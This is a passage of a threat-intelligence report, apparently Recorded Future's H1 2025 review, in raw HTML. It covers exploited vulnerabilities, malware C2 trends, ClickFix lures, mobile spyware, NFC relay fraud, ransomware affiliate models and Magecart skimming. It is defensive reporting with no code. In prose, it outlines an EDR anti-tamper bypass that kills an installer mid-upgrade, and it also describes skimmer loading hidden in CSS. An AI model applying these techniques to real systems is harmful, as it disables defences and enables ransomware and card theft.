src=\"https://www.recordedfuture.com/media_10c220f1e6f02a227d28aad59ac47b5ef1023336c.png?width=750&amp;format=png&amp;optimize=medium\" width=\"1600\" height=\"650\" />\n            </div>\n          </div>\n          <div>\n            <div><strong>Figure 6:</strong> Share of actively exploited vulnerabilities by the most common MITRE ATT&amp;CK techniques (Source: Recorded Future)</div>\n          </div>\n        </div>\n        <h3>Insikt Group Detection Rules Maintain Alignment with Known Exploited Vulnerabilities</h3>\n        <p>In the first half of 2025, Insikt Group’s own detection efforts kept pace with the evolving threat landscape by continuously creating new Nuclei templates (automated vulnerability detection signatures). Insikt Group created 27 new Nuclei templates designed to identify vulnerable systems, focusing on the most dangerous flaws. 21 out of the 27 templates corresponded to vulnerabilities that appear in CISA’s KEV catalog. In other words, the majority of Insikt Group’s detection rules were directly aligned to vulnerabilities that were known to be actively exploited in the wild.</p>\n        <p>The vendors that showed up most frequently in Insikt Group’s Nuclei templates were Fortinet, Apache, and Ivanti, which is consistent with the threat trends observed. By developing Nuclei templates for these vendors’ vulnerabilities, Insikt Group helped equip organizations to rapidly scan their infrastructure and find any unpatched instances before attackers do.</p>\n        <p>Notably, Insikt Group published 13 unique Nuclei templates that do not have an existing public template available from Project Discovery (see <strong>Figure 7</strong>). In those cases, Insikt Group authored and shared the detection logic for vulnerabilities that were not yet covered by the open-source community for Nuclei signatures, filling critical detection gaps for Recorded Future customers.</p>\n        <div>\n          <div>\n            <div>\n              <img loading=\"lazy\" alt=\"Chart\" src=\"https://www.recordedfuture.com/media_13e62d253ae561cbd5459ffd06f5e24ddf1cf1d8f.png?width=750&amp;format=png&amp;optimize=medium\" width=\"1600\" height=\"935\" />\n            </div>\n          </div>\n          <div>\n            <div>\n              <p><strong>Figure 7:</strong> Overlap of Insikt Group Nuclei templates with CISA KEV and Project Discovery</p>\n              <p>(Source: Recorded Future, CISA, Project Discovery)</p>\n            </div>\n          </div>\n        </div>\n        <p>Additionally, <strong>Figure 8</strong> shows the time between Insikt Group’s publication of a Nuclei template and the targeted vulnerability’s addition to CISA’s KEV catalog (the below chart only lists CVEs that both had a template and were added to KEV). Five vulnerabilities that were added to KEV in H1 2025 — CVE-2025-32433 (Erlang SSH), CVE-2025-24813 (Apache Tomcat), CVE-2024-41713 and CVE-2024-55550 (Mitel MiCollab), and CVE-2024-56145 (Craft CMS) — had an existing Insikt Group Nuclei template available. This means organizations leveraging Insikt Group’s detections could scan for those issues as soon as (or even before) they were formally recognized as actively exploited by CISA.</p>\n        <p>For vulnerabilities added to KEV in 2025 for which Insikt Group did not already have a Nuclei template, the average turnaround time to publish a new template was 8 days after the KEV listing.</p>\n        <div>\n          <div>\n            <div>\n              <img loading=\"lazy\" alt=\"\" src=\"https://www.recordedfuture.com/media_15f52bcf580989f13a33d9352ace9b9ac50999bdd.png?width=750&amp;format=png&amp;optimize=medium\" width=\"1600\" height=\"712\" />\n            </div>\n          </div>\n          <div>\n            <div><strong>Figure 8:</strong> Timeline comparison of Insikt Group's Nuclei template releases and CISA KEV's CVE inclusions in H1 2025 (Source: Recorded Future)</div>\n          </div>\n        </div>\n        <p>Furthermore, during vulnerability testing and validation, Insikt Group discovered that Apache Tomcat 8.5.x versions (specifically 8.5.0 to 8.5.98 and 8.5.100, with the exception of 8.5.99) were also vulnerable to CVE-2025-24813, even though they were not included in Apache’s initial list of affected product versions. In practice, this meant that many organizations running slightly older Tomcat 8.5 releases could have been unknowingly at risk if they only followed the vendor’s advisory. By identifying those versions and providing a Nuclei template, Insikt Group provided a detection rule and an early warning and remediation guidance beyond what the vendor had first communicated.</p>\n        <h2>Malware Trends</h2>\n        <h3>Key Takeaways</h3>\n        <ul>\n          <li>Legacy malware families such as Sality and Tofsee reemerged as top threats, with Sality ranking first in configuration-based C2 detections — a notable shift from recent infostealer-dominated trends and a sign that threat actors are repackaging older codebases for modern use.</li>\n          <li>Commodity remote access trojans (RATs) like AsyncRAT, XWorm, and Remcos were prominent in Recorded Future Triage data, including malware C2 extractions, reflecting a continued preference among threat actors for tools that support persistent access and data theft across varied intrusion campaigns.</li>\n          <li>MITRE ATT&amp;CK Tactic TA0011 (Command and Control) was the most frequently observed TTP across Recorded Future Triage submissions and Insikt Group reporting, with over 194,000 events recorded in H1 2025.

References to malware families in C2 detections in H1 2025 show major changes compared to H1 2024 in terms of prevalent malware families. Infostealers remain a cornerstone of the threat landscape, consistent with most threat actors’ financial motivations, as stolen credentials, payment data, and crypto wallets can be <a href=\"https://www.recordedfuture.com/research/h1-2024-malware-and-vulnerability-trends-report\">monetized</a> directly or sold on dark web markets. However, the specific malware driving these C2 detections has shifted. Several of H1 2024’s top ten malware (Vidar, RedLine Stealer, and LokiBot, for example) have largely fallen off in 2025, owing in part to disruptive operations and law enforcement actions, while other malware families surged or emerged to take their place.</p>\n        <div>\n          <div>\n            <div>\n              <img loading=\"lazy\" alt=\"Chart\" src=\"https://www.recordedfuture.com/media_13828fa4611725b145446a5a63f4ec522c8d3c36b.png?width=750&amp;format=png&amp;optimize=medium\" width=\"1600\" height=\"888\" />\n            </div>\n          </div>\n          <div>\n            <div><strong>Figure 9:</strong> The top ten malware families by number of references to C2 detections in H1 2025 and H1 2024 (Source: Recorded Future)</div>\n          </div>\n        </div>\n        <p>H1 2025’s C2 detections also highlight the enduring presence of long-lived malware. Sality, a polymorphic botnet first seen in 2003, remains in the top tier after a major <a href=\"https://go.recordedfuture.com/hubfs/reports/cta-2024-0910.pdf#:~:text=server%20configurations%2C%20a%20behavior%20previously,ongoing%20prevalence%20of%20legacy%20malware\">resurgence</a> in 2024, demonstrating the resilience of legacy threats. Likewise, the Tofsee trojan (active for over a decade) appears among the top families. Tofsee is a modular backdoor <a href=\"https://www.checkpoint.com/cyber-hub/threat-prevention/what-is-malware/tofsee-malware/#:~:text=Tofsee%20is%20a%20modular%20trojan,modules%20to%20perform%20various%20functions\">capable</a> of spamming, DDoS attacks, cryptomining, and more, and its continued activity further demonstrates how older malware can persist as a steady backbone of criminal operations. The presence of these botnets, even as their absolute reference counts are far below last year’s peak levels, indicates that threat actors still find value in exploiting well-established malware infrastructure that has stood the test of time. Notably, Sality’s and Tofsee’s ongoing use suggests that some attackers favor legacy tools either for their reliability or simply to target less-protected systems, even amid a constant influx of new malware. This mirrors the trend <a href=\"https://go.recordedfuture.com/hubfs/reports/cta-2024-0910.pdf#:~:text=server%20configurations%2C%20a%20behavior%20previously,ongoing%20prevalence%20of%20legacy%20malware\">observed</a> in H1 2024 with Sality’s reappearance, reinforcing that “outdated” malware can remain unexpectedly prevalent.</p>\n        <p>Meanwhile, last year’s infostealer frontrunner LummaC2 has seen a precipitous decline, likely a consequence of coordinated <a href=\"https://www.darkreading.com/remote-workforce/lummac2-fractures-acreed-malware-top-dog\">takedowns</a> by law enforcement agencies. In late May 2025, an international operation <a href=\"https://www.darkreading.com/remote-workforce/lummac2-fractures-acreed-malware-top-dog\">seized</a> LummaC2’s infrastructure — over 2,300 domains — and wiped its main server, severely disrupting this malware-as-a-service. As a result, LummaC2 all but vanished from the top ranks for H1 2025, echoing RedLine Stealer’s massive drop-off following the April 2023 GitHub repository <a href=\"https://www.securityweek.com/takedown-of-github-repositories-disrupts-redline-malware-operations/#:~:text=Working%20together%20with%20SaaS%20platform,drop%20resolvers\">takedown</a> that broke RedLine’s C2 panels. However, Insikt Group recently discovered that LummaC2 operators have begun to reestablish infrastructure using Cloudflare-based C2 domains, signaling at least a partial operational recovery. Multiple new domains tied to LummaC2, observed as recently as mid-July 2025, resolve to Cloudflare IP addresses — a shift back to previous tactics following an initial pivot away from the provider after the takedown. This rapid pivot highlights the underlying resilience and <a href=\"https://www.recordedfuture.com/research/behind-the-curtain-how-lumma-affiliates-operate\">adaptability</a> of LummaC2’s operators, who appear capable of reconstituting infrastructure and tactics even in the wake of extensive disruption.</p>\n        <p>Another development in H1 2025 is the increased prominence of remote access trojans (RATs) in C2 detections. Several commodity RAT families, including Remcos, AsyncRAT, and XWorm, climbed into the top ten this period. These RATs are freely or cheaply available and grant attackers hands-on control over compromised systems, making them versatile for espionage and data theft and as launchpads for ransomware. The ascent of these RATs suggests that many threat actors are leveraging RATs to maintain persistent, interactive access in victim environments, an approach favored by financially motivated groups and advanced actors alike. Their growing share in C2 detections may also imply that, as some infostealing services were disrupted, adversaries pivoted to using RATs, which often include info-stealing capabilities, as an alternative means to achieve similar goals.</p>\n        <p>Overall, the C2 detection trends of H1 2025 reflect an evolving threat landscape that is both dynamic and cyclical. While Insikt Group observes constant churn at the top, some long-standing threats and tools never truly disappear but persist or resurge in cycles, contributing steadily to the baseline of malicious activity. Financially motivated actors remain dominant, favoring infostealers and RATs that directly feed their profit motives. H1 2025’s C2 detections were defined by a revival of credential-stealing trojans amid a backdrop of resilient legacy botnets and increased reliance on RATs for interactive control. These trends underscore that defenders must be prepared for both cutting-edge malware and the enduring tactics of established threats moving into the latter half of 2025 and beyond.</p>\n        <h3>Malware TTP Trends and Insights</h3>\n        <p>Between January and June 2025, Recorded Future's Insikt Group analyzed and aggregated thousands of malware-related observations to identify the top tactics, techniques, and procedures (TTPs) employed by threat actors mapped to the MITRE ATT&amp;CK® framework. This data is sourced from Recorded Future Triage public sandbox submissions and Insikt Group reporting. Leading the list by a significant margin is the Command and Control (TA0011) tactic, with over 194,000 observations, highlighting its central role in enabling adversary communication with compromised systems.</p>\n        <p>Frequently observed TTPs include Data Encrypted for Impact (T1486), indicative of widespread ransomware activity, and Data from Local System (T1005), pointing to persistent data theft operations. Initial Access (TA0001) techniques such as Valid Accounts (T1078) and External Remote Services (T1133) were also highly represented, indicating adversary focus on stealing credentials and then using them to gain access via external-facing remote services. External Remote Services is also a persistence technique, discussed later in this section.</p>\n        <div>\n          <div>\n            <div>\n              <img loading=\"lazy\" alt=\"\" src=\"https://www.recordedfuture.com/media_1b05bb181e791a9aa6bd4387bab22f4ad33a99c9f.png?width=750&amp;format=png&amp;optimize=medium\" width=\"1600\" height=\"956\" />\n            </div>\n          </div>\n          <div>\n            <div><strong>Figure 10:</strong> The top ten TTPs in H1 2025 based on Recorded Future Triage and Insikt Group reporting (Source: Recorded Future)</div>\n          </div>\n        </div>\n        <p>Insikt Group observed ClickFix as a prominent, emerging initial access technique in H1 2025. ClickFix is a social engineering technique that tricks users into running malicious scripts by presenting deceptive error messages or verification instructions, either prompting them to paste and execute commands manually or by using clipboard hijacking to automate the process. First <a href=\"https://www.group-ib.com/blog/clickfix-the-social-engineering-technique-hackers-use-to-manipulate-victims/\">identified</a> in October 2023, the technique gained significant traction in the latter half of 2024, with its use <a href=\"https://www.welivesecurity.com/en/eset-research/eset-threat-report-h1-2025/\">surging</a> by 517% year-over-year during the first half of 2025, according to ESET.</p>\n        <div>\n          <div>\n            <div>\n              <img loading=\"lazy\" alt=\"\" src=\"https://www.recordedfuture.com/media_1ee1fae41d379a0c8ee89ebf7d3d296cbcbe68aa6.png?width=750&amp;format=png&amp;optimize=medium\" width=\"1600\" height=\"893\" />\n            </div>\n          </div>\n          <div>\n            <div><strong>Figure 11:</strong> Illustration of ClickFix social engineering attack chain (Source: Recorded Future)</div>\n          </div>\n        </div>\n        <p>Further, the presence of Compromise Accounts (T1586) and External Remote Services (T1133) suggests adversaries are focusing on persistence and remote access.

LockBit is a notorious ransomware family that has remained operational despite significant law enforcement efforts to dismantle it, notably through \"Operation Cronos\" in early 2024, which aimed to disrupt its infrastructure. Babuk and Chaos had source code leaked in <a href=\"https://therecord.media/babuk-source-code-leak-leads-to-new-ransomware-variants\">June 2021</a> and <a href=\"https://blog.talosintelligence.com/code-leaks-new-ransomware-actors/\">April 2022</a>, respectively.

The <a href=\"https://www.mckinsey.com/industries/financial-services/our-insights/the-state-of-retail-banking-profitability-and-growth-in-the-era-of-digital-and-ai\">increased</a> <a href=\"https://www.gsma.com/sotir/wp-content/uploads/2025/04/The-State-of-the-Industry-Report-2025_English.pdf\">adoption</a> of <a href=\"https://www.aba.com/news-research/analysis-guides/preferred-banking-methods\">mobile devices</a> for mobile banking and in corporate environments offers financially motivated threat actors an even larger attack surface. Particularly attractive is the <a href=\"https://www.infosecurity-magazine.com/news/50-mobile-devices-run-outdated/\">prevalence</a> of vulnerable mobile devices powered by outdated operating systems that lack the latest security patches.</p>\n        <p>The return of Predator was likely <a href=\"https://www.recordedfuture.com/research/predator-still-active-new-links-identified\">sustained</a> by continued commercial demand despite international scrutiny. Similarly, Graphite was <a href=\"https://citizenlab.ca/2025/06/first-forensic-confirmation-of-paragons-ios-mercenary-spyware-finds-journalists-targeted/\">detected</a> on devices belonging to European journalists, <a href=\"https://www.amnesty.org/en/latest/news/2025/06/italy-new-case-of-journalist-targeted-with-graphite-spyware-confirms-widespread-use-of-unlawful-surveillance/\">indicating</a> ongoing misuse in targeted surveillance. Lastly, new <a href=\"https://hunt.io/blog/lightspy-malware-targets-facebook-instagram#Findings\">detections</a> of LightSpy, a spyware <a href=\"https://www.kaspersky.com/blog/lightspy-watering-hole-attack/34501/\">linked</a> to Chinese state-sponsored surveillance in Hong Kong, almost certainly indicate sustained regional espionage efforts against mobile users.</p>\n        <h4>Threat Actors Favor Fake Downloads, Abuse Official Stores, and Exploit Supply Chains</h4>\n        <p>Threat actors consistently relied on long-established TTPs to deliver mobile malware, primarily combining social engineering tactics like smishing and vishing, with fake downloads and brand impersonation to lure victims into installing malicious APKs. Campaigns often featured phishing pages and malware payloads mimicking <a href=\"https://www.proofpoint.com/us/blog/threat-insight/update-fake-updates-two-new-actors-and-new-mac-malware\">popular browsers</a>, <a href=\"https://s2w.inc/en/resource/detail/780?utm_source=twitter&amp;utm_medium=social-posts&amp;utm_campaign=ti-reports&amp;utm_term=malware&amp;utm_content=docswap\">cryptocurrency platforms</a>, <a href=\"https://cyble.com/blog/tsarbot-using-overlay-attacks-targeting-bfsi-sector/\">financial apps</a>, <a href=\"https://zimperium.com/blog/from-lock-screen-to-wallets-btmob-rat-now-targets-alipay-pins\">streaming services</a>, and <a href=\"https://www.ctfiot.com/243403.html\">official app stores</a>. In more targeted cases, attackers tailored lures to specific victims, as exemplified by Android.Spy.1292.origin, which <a href=\"https://news.drweb.com/show/?i=15006&amp;lng=en&amp;c=5\">targeted</a> Russian military personnel by impersonating Alpine Quest Pro, a GPS and topographic mapping app reportedly used by both civilians and Russian military personnel.</p>\n        <p>Threat actors also employed less common but effective distribution methods, including abusing Google Play to deliver malware. While increasingly <a href=\"https://blog.google/products/google-play/keeping-google-play-safe-2025/\">robust</a> security measures have made delivering malware through official app stores more difficult, adversaries continued to find workarounds. SpyLend, for example, <a href=\"https://www.cyfirma.com/research/spylend-the-android-app-available-on-google-play-store-enabling-financial-cyber-crime-extortion/\">posed</a> as “Finance Simplified” and evaded detection by offloading the malicious payload via external download links. Additionally, in a rare supply-chain compromise, a new variant of the Triada RAT was <a href=\"https://www.kaspersky.ru/about/press-releases/novaya-versiya-triada-kradyot-kriptovalyutu-akkaunty-v-messendzherah-i-podmenyaet-nomera-telefonov-vo-vremya-zvonkov\">discovered</a> pre-installed on counterfeit Android devices sold via unauthorized retailers.</p>\n        <h4>Accessibility Service Abuse With a Twist</h4>\n        <p>Once installed, Android-targeting malware frequently abused the brand’s Accessibility services, a <a href=\"https://www.bitdefender.co.uk/blog/hotforsecurity/accessibility-service-an-android-blessing-and-a-security-challenge-in-the-same-package/\">long-standing</a> TTP that grants broad control over infected devices. Android malware <a href=\"https://www.threatfabric.com/blogs/exposing-crocodilus-new-device-takeover-malware-targeting-android-devices\">abused</a> the functionality to <a href=\"https://cyble.com/blog/tsarbot-using-overlay-attacks-targeting-bfsi-sector/\">steal</a> <a href=\"https://cyble.com/blog/btmob-rat-newly-discovered-android-malware/\">sensitive</a> <a href=\"https://securelist.com/sparkcat-stealer-in-app-store-and-google-play/115385/\">information</a> through overlay attacks, intercept text messages and push notifications, perform keylogging, screen and audio recording, and OCR-based image scanning, and ultimately take over the device to facilitate so-called “on-device fraud.”</p>\n        <p>The Android trojan GodFather stood out during the reporting timeframe for introducing a new overlay technique. While still abusing Android’s Accessibility services, a new iteration of GodFather <a href=\"https://zimperium.com/blog/your-mobile-app-their-playground-the-dark-side-of-the-virtualization\">identified</a> in June 2025 was observed employing a virtualization-based overlay technique that combined open-source hooking frameworks such as Xposed with sandboxed app environments. This approach differs from traditional overlay attacks by using VirtualApp to create a virtualized environment that runs cloned banking apps without installing or modifying them on the device, effectively bypassing standard overlay detection mechanisms.</p>\n        <h4>Threats to Contactless Payments Continue to Rise</h4>\n        <div>\n          <div>\n            <div>\n              <img loading=\"lazy\" alt=\"\" src=\"https://www.recordedfuture.com/media_199e894e6cd0d1faf691fc5e9d9ef345e45171af8.png?width=750&amp;format=png&amp;optimize=medium\" width=\"1600\" height=\"1332\" />\n            </div>\n          </div>\n          <div>\n            <div><strong>Figure 13:</strong> Illustration of NFC-relay attack flow (Source: Recorded Future)</div>\n          </div>\n        </div>\n        <p>In the first half of 2025, mobile malware posed a growing threat to contactless payment systems, exemplified by the <a href=\"https://www.cleafy.com/cleafy-labs/supercardx-exposing-chinese-speaker-maas-for-nfc-relay-fraud-operation\">emergence</a> of SuperCard X, a Chinese-language MaaS platform targeting Android devices. The malware enables threat actors to conduct NFC relay fraud by tricking victims into tapping their contactless cards against compromised phones. Once a card is tapped, SuperCard X captures the NFC signal and relays it to a remote device controlled by the attacker, facilitating fraudulent transactions or ATM withdrawals. Its functionality closely mirrors that of NFCGate, an open-source tool <a href=\"https://github.com/nfcgate/nfcgate\">developed</a> in 2020, and shares similarities with NGate, an Android malware <a href=\"https://www.welivesecurity.com/en/eset-research/ngate-android-malware-relays-nfc-traffic-to-steal-cash/\">linked</a> to NFC-based attacks in the Czech Republic during 2024, indicating likely code reuse or conceptual overlap.</p>\n        <p>Notably, the use of NFCGate-style techniques in real-world attacks has grown steadily. In January 2025, Russian cybersecurity firm F6 <a href=\"https://www.f6.ru/blog/nfcgate/\">reported</a> more than 100 such NFC relay attacks during 2024, with estimated losses of approximately $400,000. In a follow-up report from April 2025, F6 <a href=\"https://www.f6.ru/blog/reverse-nfcgate/\">documented</a> an additional 40 successful NFCGate-based attacks, with an average loss of approximately $1,500.</p>\n        <h3>Ransomware</h3>\n        <h4>Ransomware Groups Innovate to Attract Affiliates Amid a Reshaped Landscape</h4>\n        <p>In the first half of 2025, the ransomware landscape continued to evolve, <a href=\"https://www.bleepingcomputer.com/news/security/clop-ransomware-claims-responsibility-for-cleo-data-theft-attacks/\">witnessing</a> the return of CL0P after a relatively quiet 2024, with its Cleo managed file transfer (MFT) data theft campaign. This campaign potentially affected over 300 organizations globally, according to Recorded Future ransomware victim data. Alongside the continued activity of groups like Akira and Play, several lesser-known and emerging ransomware groups gained traction, likely reflecting the lingering vacuum and uncertainty that resulted from LockBit’s infrastructure <a href=\"https://www.europol.europa.eu/media-press/newsroom/news/law-enforcement-disrupt-worlds-biggest-ransomware-operation\">takedown</a> and ALPHV’s <a href=\"https://therecord.media/europol-doj-nca-deny-involvement-in-alphv-blackcat-ransomware-takedown\">exit scam</a> in early 2024.</p>\n        <p>Two additional events further reshaped the ransomware landscape in early 2025. These were the demise of BlackBasta in early February, which followed a <a href=\"https://www.trellix.com/blogs/research/analysis-of-black-basta-ransomware-chat-leaks/\">leak</a> of internal chat logs, and the abrupt <a href=\"https://www.cybereason.com/blog/threat-alert-qilin-seizes-control\">disbandment</a> of RansomHub in late March, which left victims mid-negotiation and affiliates in disarray. Insikt Group assesses that BlackBasta members likely migrated to other operations, including Akira, with whom the group had prior connections. Group-IB also <a href=\"https://www.group-ib.com/blog/ransomware-debris/\">assessed</a> that some RansomHub affiliates may have joined Qilin, a ransomware-as-a-service (RaaS) group active since July 2022, citing a spike in victim claims, internal restructuring, and increased activity on cybercriminal forums like RAMP. Meanwhile, DragonForce, a ransomware group <a href=\"https://blog.barracuda.com/2025/06/09/dragonforce-ransomware-cartel-vs--everybody\">active</a> since at least late 2023, <a href=\"https://www.guidepointsecurity.com/blog/ransomsnub-ransomhubs-affiliate-confusion/\">claimed</a> to have absorbed RansomHub’s infrastructure and affiliates, potentially as a result of a <a href=\"https://news.sophos.com/en-us/2025/05/21/dragonforce-targets-rivals-in-a-play-for-dominance/\">hostile takeover</a>. DragonForce is not averse to such aggressive tactics; the group was <a href=\"https://www.hipaajournal.com/lockbit-ransomware-group-hacked/\">identified</a> as a potential culprit behind the May 7, 2025, defacement of LockBit’s affiliate administrative panels and leak of affiliates’ information, and the April 5, 2025, <a href=\"https://www.bleepingcomputer.com/news/security/everest-ransomwares-dark-web-leak-site-defaced-now-offline/\">defacement</a> of Everest’s extortion blog.</p>\n        <div>\n          <div>\n            <div>\n              <img loading=\"lazy\" alt=\"Chart\" src=\"https://www.recordedfuture.com/media_11accbf481b1cd5ea298aa6d189b8ad856493bf52.png?width=750&amp;format=png&amp;optimize=medium\" width=\"1600\" height=\"823\" />\n            </div>\n          </div>\n          <div>\n            <div><strong>Figure 14:</strong> Top ten ransomware groups by number of victims claimed in H1 2025 (Source: Recorded Future)</div>\n          </div>\n        </div>\n        <p>To gain notoriety in this ever-evolving ransomware landscape, attract affiliates, and scale operations, ransomware threat actors modified their business models. In mid-March 2025, DragonForce <a href=\"https://news.sophos.com/en-us/2025/05/21/dragonforce-targets-rivals-in-a-play-for-dominance/\">rebranded</a> as a “cartel”, launching a more flexible affiliate model and targeting other ransomware groups. Under the new model, affiliates can <a href=\"https://www.secureworks.com/blog/ransomware-groups-evolve-affiliate-models\">use</a> DragonForce’s infrastructure and ransomware tools while operating under independent brands. DragonForce also <a href=\"https://blog.barracuda.com/2025/06/09/dragonforce-ransomware-cartel-vs--everybody\">signaled</a> an openness to partner with or absorb other threat actors rather than just individual affiliates. For example, threat actors employing TTPs associated with Scattered Spider, a financially motivated cybercrime collective, reportedly <a href=\"https://www.bbc.com/news/articles/cr58pqjlnjlo\">breached</a> a UK retail company and deployed DragonForce ransomware. The “cartel” approach effectively differentiates DragonForce from other RaaS offerings and is likely to appeal to a range of threat actors, broadening the group’s affiliate base and increasing potential revenue. However, it does not solve issues that have <a href=\"https://www.coveware.com/blog/2025/4/29/the-organizational-structure-of-ransomware-threat-actor-groups-is-evolving-before-our-eyes\">plagued</a> other, more established RaaS operations. The shared infrastructure continues to introduce an element of risk: if an affiliate is compromised, other affiliates' operational and victim details could also be exposed.</p>\n        <p>Anubis, a ransomware operation first <a href=\"https://www.kelacyber.com/blog/anubis-a-new-ransomware-threat/\">observed</a> in December 2024, used a different tactic to entice affiliates. In late February 2025, the group <a href=\"https://www.kelacyber.com/blog/anubis-a-new-ransomware-threat/\">debuted</a> an affiliate model that features three modes. The first is a traditional RaaS model in which Anubis provides a ransomware payload and affiliates perceive 80% of any extorted ransom. The second is a data ransom model in which Anubis helps affiliates monetize sensitive data they have already stolen from target companies. The third model allows affiliates to provide Anubis operators with initial access to corporate networks in return for 50% of any extorted ransom.</p>\n        <p>Lastly, in mid-June 2025, Qilin <a href=\"https://blog.qualys.com/vulnerabilities-threat-research/2025/06/18/qilin-ransomware-explained-threats-risks-defenses\">introduced</a> a new function dubbed “Call Lawyer,” offering affiliates legal consultation on how to intimidate victims during the negotiation phase.</p>\n        <h4>New Initial Access, Defense Evasion, and Malware Deployment Techniques</h4>\n        <p>Parallel to changes in the broader ransomware landscape and RaaS offerings, Insikt Group observed ransomware threat actors adopt new TTPs across multiple phases of the attack chain, including initial access, defense evasion, and payload deployment.</p>\n        <ul>\n          <li><strong>Initial Access:</strong> According to Sekoia, Interlock ransomware <a href=\"https://blog.sekoia.io/interlock-ransomware-evolving-under-the-radar/\">used</a> ClickFix in social engineering attacks impersonating IT tools between January and February 2025. As mentioned in the Malware TTP Trends and Insights section of this report, ClickFix is a social engineering method that uses fake error messages or verification prompts to deceive victims into executing malicious scripts, either manually or via automatic clipboard manipulation.</li>\n        </ul>\n        <ul>\n          <li><strong>Defense Evasion:</strong> Per Palo Alto’s Unit42 and ESET, ransomware threat actors are <a href=\"https://unit42.paloaltonetworks.com/2025-ransomware-extortion-trends/\">increasingly</a> <a href=\"https://www.welivesecurity.com/en/eset-research/shifting-sands-ransomhub-edrkillshifter/#leveraging-edrkillshifter\">using</a> “EDR killers,” tools designed to terminate defensive software, further confirming a trend that has been <a href=\"https://news.sophos.com/en-us/2022/12/13/signed-driver-malware-moves-up-the-software-trust-chain/\">ongoing</a> since 2022. Notably, ransomware threat actors are also employing new “bring-your-own-installer” (BYOI) techniques to disable EDR altogether. As reported by Aon, a Babuk ransomware intrusion saw the attacker <a href=\"https://www.aon.com/en/insights/cyber-labs/bring-your-own-installer-bypassing-sentinelone\">exploiting</a> a flaw in SentinelOne’s upgrade/downgrade process to bypass its anti-tamper protections without needing the management console code. By running a legitimate installer for a different version and terminating the msiexec.exe process mid-upgrade, the attacker left the system without active EDR protection. This created a window in which Babuk ransomware could be executed on an unprotected endpoint. The bypass was confirmed to work across multiple SentinelOne versions unless the \"Online Authorization\" setting was enabled.</li>\n        </ul>\n        <ul>\n          <li><strong>Payload Deployment:</strong> Trend Micro <a href=\"https://www.trendmicro.com/en_no/research/25/e/agenda-ransomware-group-adds-smokeloader-and-netxloader-to-their.html\">reported</a> that Qilin ransomware attacks used a custom and heavily obfuscated .NET-based loader dubbed NETXLOADER to deliver ransomware payloads and SmokeLoader in memory. NETXLOADER is protected by .NET Reactor. It stealthily decrypts and directly injects payloads into memory using dynamic API calls and JIT hooking to evade detection.</li>\n        </ul>\n        <p>Additionally, ransomware threat actors employed uncommon and legitimate software tools during their intrusion, almost certainly to collect data, achieve persistence, and move laterally, while avoiding detection. For example, in mid-June 2025, Symantec <a href=\"https://www.security.com/threat-intelligence/fog-ransomware-attack\">reported</a> that a May 2025 Fog ransomware attack targeting a financial institution in Asia involved dual-use and open-source penetration testing tools not typically associated with ransomware operations. These included the following:</p>\n        <ul>\n          <li><strong>Syteca:</strong> A legitimate employee monitoring software with keylogging and screen capture capabilities, which Fog operators likely used for espionage and credential theft, followed by cleanup actions to evade detection</li>\n          <li><strong>GC2:</strong> An open-source C2 framework that uses Google Sheets or SharePoint for command execution and file exfiltration, which Fog operators likely used for remote access, persistence, and defense evasion via cloud-based communications</li>\n          <li><strong>Adaptix:</strong> An open-source post-exploitation agent similar to Cobalt Strike, which Fog operators likely used for remote access and internal lateral movement through encrypted C2</li>\n          <li><strong>Stowaway:</strong> An open-source proxy tool for creating covert communication tunnels between compromised hosts and operators, which Fog operators likely used to evade defenses by proxying communications and delivering Syteca</li>\n        </ul>\n        <p>This pattern was not unique to Fog ransomware. A July 2025 CISA report <a href=\"https://www.cisa.gov/news-events/cybersecurity-advisories/aa25-203a\">detailed</a> Interlock ransomware campaigns that likewise repurposed legitimate tools to evade detection and maintain access. Threat actors installed AnyDesk, a remote monitoring and management application, to preserve access and facilitate file transfers, and used PuTTY, a widely used SSH client, to establish tunnels for covert communications and pivot between compromised systems.</p>\n        <p>Incorporating commercially available and dual-use software into their intrusion workflows, ransomware threat actors can blend in with routine administrative activity, making malicious actions less likely to trigger security alerts. This continued adoption of legitimate or dual-use software by ransomware actors underscores a broader trend toward intrusion methods designed to evade detection while enabling adaptable, multi-purpose operations inside victim networks.</p>\n        <h3>Magecart Infections Remained High in H1 2025</h3>\n        <p>In the first half of 2025, Magecart e-skimming continued to threaten online merchants at scale. Infection volumes remained near the record highs seen in late 2024, albeit with a slight decline from the peak. Thousands of e-commerce domains were impacted in H1 2025, keeping Magecart a widespread concern for payment security. This sustained activity follows an unprecedented <a href=\"https://www.recordedfuture.com/research/annual-payment-fraud-intelligence-report-2024#:~:text=Magecart%20E\">spike</a> in Magecart incidents during 2024, when the number of affected e-commerce domains roughly tripled compared to 2023. That surge was largely driven by the <a href=\"https://www.recordedfuture.com/research/annual-payment-fraud-intelligence-report-2024#:~:text=Magecart%20E\">exploitation</a> of a critical Adobe Commerce (Magento) vulnerability dubbed CosmicSting (CVE-2024-34102), which enabled mass compromise of merchant websites. Organized threat groups also amplified the outbreak; for example, one Magecart group (known as “Burunduki”) alone infected over 200 online stores globally in late 2024. By early 2025, patches and defensive measures began curbing the CosmicSting-fueled wave, but overall Magecart infection rates remained significantly elevated above early 2024 levels.</p>\n        <div>\n          <div>\n            <div>\n              <img loading=\"lazy\" alt=\"\" src=\"https://www.recordedfuture.com/media_13465e3a8dc32f8f6c1f5d88798326a3c3b664e19.png?width=750&amp;format=png&amp;optimize=medium\" width=\"1600\" height=\"846\" />\n            </div>\n          </div>\n          <div>\n            <div><strong>Figure 15:</strong> Illustration of Magecart skimming attack flow (Source: Recorded Future)</div>\n          </div>\n        </div>\n        <p>Magecart operators in H1 2025 continued to leverage malware kits and tactics introduced in the prior year, while also expanding into new platforms. Out-of-the-box e-skimmer kits such as “Sniffer by Fleras”, first <a href=\"https://www.recordedfuture.com/research/annual-payment-fraud-intelligence-report-2024#:~:text=Magecart%20E\">observed</a> in 2024, remained active in compromises of online stores. Meanwhile, attackers broadened their focus beyond Magento; notably, Magecart skimmers extended to WordPress-based retail sites by <a href=\"https://socradar.io/magecart-skimmer-attack-targets-woocommerce-and-authorize-net-payment-gateway-plugin/#:~:text=Online%20transactions%20ease%20our%20daily,WordPress%20environments%2C%20particularly%20those%20using%C2%A0WooCommerce\">exploiting</a> WooCommerce plugins. These campaigns underline how Magecart techniques have widened in scope, targeting a broader range of e-commerce platforms rather than just traditional Magento stores.</p>\n        <p>Finally, Magecart skimming techniques continued to evolve in H1 2025. Threat actors experimented with more covert loading methods to evade detection. In one example, attackers <a href=\"https://securityboulevard.com/2025/05/new-breed-of-magecart-gtms-working-together-javascript-hidden-in-css/\">used</a> a modular chain of Google Tag Manager (GTM) containers, where one container loaded a fake CSS file that embedded JavaScript within a ::before content property. A second GTM container then 